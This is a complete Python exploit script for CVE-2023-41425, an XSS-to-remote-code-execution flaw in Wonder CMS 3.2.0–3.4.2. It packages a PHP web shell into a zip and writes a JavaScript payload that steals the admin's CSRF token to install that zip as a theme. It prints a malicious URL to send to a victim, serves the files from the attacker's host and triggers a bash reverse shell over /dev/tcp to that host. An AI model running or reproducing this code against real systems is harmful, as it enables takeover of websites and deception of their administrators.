# CVE-2023-41425
import requests
import threading
import argparse
import zipfile
from http.server import SimpleHTTPRequestHandler, HTTPServer
import urllib.parse

'''Cross Site Scripting vulnerability in Wonder CMS v.3.2.0 thru v.3.4.2
 allows a remote attacker to execute arbitrary code via a crafted script 
 uploaded to the installModule component.
'''

def get_args():
    parser = argparse.ArgumentParser(description="Parse for needed arguments")

    # Define the arguments
    parser.add_argument('-rhost', '--RHOST', type=str, required=True, help='Target host loginURL - http://example.com/loginURL')
    parser.add_argument('-lhost', '--LHOST', type=str, required=True, help='Listening host IP')
    parser.add_argument('-lport', '--LPORT', type=str, required=True, help='Listening port')
    parser.add_argument('-sport', '--SPORT', type=str, required=True, help='Server port')

    # Parse the arguments
    args = parser.parse_args()



    # Initialize variables
    return args.RHOST, args.LHOST, args.LPORT, args.SPORT

def create_zip_file():
    zip_dir = "shell/shell.php"
    zip_filename = 'shell.zip'
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.write(zip_dir, arcname=zip_dir)

def create_js_payload(RHOST, LHOST, SPORT):
    js_payload = f'''var xhr=new XMLHttpRequest();
    xhr.open("GET", "{RHOST}/?installModule=http://{LHOST}:{SPORT}/shell.zip&directoryName=shell&type=themes&token=" + document.querySelectorAll('[name="token"]')[0].value, true);
    xhr.send();
    '''
    js_filename = "xss.js"
    with open(js_filename, 'w') as file:
        file.write(js_payload)

def print_js_payload(RHOST, LHOST, SPORT):
    print("[+] Send the xss URL to the victim: ")
    print(f'''{RHOST}/index.php?page=loginURL?"></form><script+src="http://{LHOST}:{SPORT}/xss.js"></script><form+action="''')


# Global variable to track the number of requests
request_count = 0
request_lock = threading.Lock()

class CustomHTTPRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        global request_count
        with request_lock:
            request_count += 1
            if request_count >= 2:
                if not request_received.is_set():
                    request_received.set()
        # Call the parent class's do_GET method to handle the request
        super().do_GET()

request_received = threading.Event()


def start_server(SPORT, LHOST):
    server_port = int(SPORT)
    with HTTPServer((LHOST, server_port), CustomHTTPRequestHandler) as httpd:
        print(f"[+] Serving at http://{LHOST}:{server_port}")
        # Serve until manually stopped
        httpd.serve_forever()

def send_payload(LHOST, LPORT, RHOST):
    # Construct payload URL
    payload = f"""bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'"""
    # URL encode payload
    encoded_payload = urllib.parse.quote(payload)
    # build URL where payload exists
    payload_url = f"""{RHOST}/../themes/shell/shell.php?0={encoded_payload}"""
    
    # Trigger the payload
    response = requests.get(payload_url)
    print(payload_url)
    print(f"[+] Payload sent, response status code: {response.status_code}")

if __name__ == "__main__":
    RHOST, LHOST, LPORT, SPORT = get_args()
    print(f"[+] Set up a nc listener: nc -lnvp {LPORT}")
    

    # Create zip file and JavaScript payload
    create_zip_file()
    create_js_payload(RHOST, LHOST, SPORT)
    print_js_payload(RHOST, LHOST, SPORT)

    # Start the server in a separate thread
    server_thread = threading.Thread(target=start_server, args=(SPORT, LHOST))
    server_thread.start()

    # Wait for at least two requests to be received
    request_received.wait()

    # Perform the payload request
    send_payload(LHOST, LPORT, RHOST)
